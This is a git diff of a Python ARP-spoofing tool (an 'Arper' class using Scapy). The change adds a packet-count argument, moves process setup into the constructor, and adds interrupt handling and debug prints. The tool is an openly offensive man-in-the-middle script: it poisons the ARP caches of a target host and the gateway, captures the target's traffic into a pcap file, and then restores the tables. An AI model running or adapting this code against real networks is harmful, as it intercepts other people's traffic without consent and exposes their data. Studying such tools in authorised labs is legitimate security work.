@@ -14,7 +14,11 @@ def getmac(target_ip):
 
 class Arper:
 
-    def __init__(self, target, gateway, iface):
+    def __init__(self, target, gateway, iface, count):
+        self.poison_thread = Process(target=self.poison)
+        self.sniff_thread = Process(target=self.sniff)
+        
+        self.count = count
         self.target = target
         self.targetmac = getmac(target)
         self.gateway = gateway
@@ -25,19 +29,21 @@ class Arper:
         conf.verb = 0
 
         print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Interface: {Fore.GREEN}{iface}{Style.RESET_ALL}')  
-        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Target ({target}) MAC: {Fore.GREEN}{self.targetmac}{Style.RESET_ALL}')  
-        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Gateway ({gateway}) MAC: {Fore.GREEN}{self.gatewaymac}{Style.RESET_ALL}\n') 
+        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Target ({Fore.YELLOW}{target}{Style.RESET_ALL}) MAC: {Fore.GREEN}{self.targetmac}{Style.RESET_ALL}')  
+        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Gateway ({Fore.YELLOW}{gateway}{Style.RESET_ALL}) MAC: {Fore.GREEN}{self.gatewaymac}{Style.RESET_ALL}\n') 
 
     def run(self):
         try:
-            self.poison_thread = Process(target=self.poison)
             self.poison_thread.start()
-
-            self.sniff_thread = Process(target=self.sniff)
             self.sniff_thread.start()
 
         except Exception as e:
             print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
+            self.poison_thread.terminate() ###
+            self.sniff_thread.terminate() ###
+            sys.exit()
+
+        except KeyboardInterrupt:
             self.poison_thread.terminate() ###
             self.sniff_thread.terminate() ###
             sys.exit()
@@ -79,9 +85,18 @@ class Arper:
                 
             except Exception as e:
                 print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
+
+                self.poison_thread.terminate() ###
+                self.sniff_thread.terminate() ###   
                 sys.exit()
 
-    def sniff(self, count=100):
+            except KeyboardInterrupt:
+                print('Test: exiting poison func to enter restore func...') ### testing
+                
+                self.restore()
+                sys.exit() ###
+
+    def sniff(self):
 
         try:
             time.sleep(3)
@@ -90,33 +105,41 @@ class Arper:
 
         filename = f'arper-{self.target}-{self.gateway}.pcap'
 
-        if count == 0:
+        if self.count == 0:
             print(f'\n[{Fore.YELLOW}?{Style.RESET_ALL}] Sniffing packets indefinitely...')
         else:
-            print(f'\n[{Fore.YELLOW}?{Style.RESET_ALL}] Sniffing {count} packets...')
+            print(f'\n[{Fore.YELLOW}?{Style.RESET_ALL}] Sniffing {self.count} packets...')
 
         try:     
             bpf_filter = 'ip host %s' % self.target
-            packets = sniff(count=count, filter=bpf_filter, iface=self.iface) ###
+            packets = sniff(count=self.count, filter=bpf_filter, iface=self.iface) ###
 
         except Exception as e:
             print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
+
+            self.poison_thread.terminate() ###
+            self.sniff_thread.terminate() ### 
+            sys.exit()
+
+        except KeyboardInterrupt:
+            self.poison_thread.terminate() ###
+            self.sniff_thread.terminate() ### 
             sys.exit()
         
         else:
             wrpcap(filename, packets)
             print(f'\n[{Fore.GREEN}+{Style.RESET_ALL}] Packets captured and saved in {Fore.GREEN}{filename}{Style.RESET_ALL}.')
             self.restore()
-            print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Sniffing finnished succesfully.')
+            print(f'\n[{Fore.GREEN}+{Style.RESET_ALL}] Sniffing finnished succesfully.')
             self.poison_thread.terminate() ###
-            self.sniff_thread.terminate() ###
+            #self.sniff_thread.terminate() ### 
             
 
     def restore(self):
 
         print('Test: entered restore func succesflly') ### testing
 
-        print(f'[{Fore.YELLOW}?{Style.RESET_ALL}] Restoring ARP tables...')
+        print(f'\n[{Fore.YELLOW}?{Style.RESET_ALL}] Restoring ARP tables...')
 
         try:
             send(ARP(op = 2, psrc = self.gateway, hwsrc = self.gatewaymac, pdst = self.target, hwdst = 'ff:ff:ff:ff:ff:ff'), count = 5)
@@ -126,16 +149,21 @@ class Arper:
             print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
             sys.exit()
 
+        except KeyboardInterrupt:
+            self.poison_thread.terminate() ###
+            self.sniff_thread.terminate() ### 
+            #sys.exit()
+
         else:
             print(f'[{Fore.GREEN}+{Style.RESET_ALL}] ARP tables restored.')
             self.poison_thread.terminate() ###
-            self.sniff_thread.terminate() ###
+            #self.sniff_thread.terminate() ### 
 
-def arpspoof(target, gateway, iface):
+def arpspoof(target, gateway, iface, count):
 
-    arp = Arper(target, gateway, iface)
+    arp = Arper(target, gateway, iface, count)
     arp.run()
 
 if __name__ == '__main__': # for test
-    arpspoof('192.168.1.2', '192.168.1.1', 'wlp1s0')
-    
+    arpspoof('192.168.1.249', '192.168.1.2', 'wlp1s0', 100)
+   
